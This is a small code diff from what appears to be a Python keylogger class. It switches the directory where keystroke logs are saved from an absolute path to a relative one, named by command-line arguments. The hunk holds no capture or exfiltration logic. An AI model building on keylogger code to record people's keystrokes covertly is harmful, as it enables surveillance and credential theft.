@@ -62,8 +62,8 @@ class Keylogger:
             :-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
         Path(
-            f"/logs/{sys.argv[2]}/{sys.argv[1]}").mkdir(parents=True, exist_ok=True)
-        self.filename = f"/logs/{sys.argv[2]}/{sys.argv[1]}/keylog-{start_dt_str}_{end_dt_str}"
+            f"./logs/{sys.argv[2]}/{sys.argv[1]}").mkdir(parents=True, exist_ok=True)
+        self.filename = f"./logs/{sys.argv[2]}/{sys.argv[1]}/keylog-{start_dt_str}_{end_dt_str}"
 
     def report_to_file(self):
         """This method creates a log file in the current directory that contains
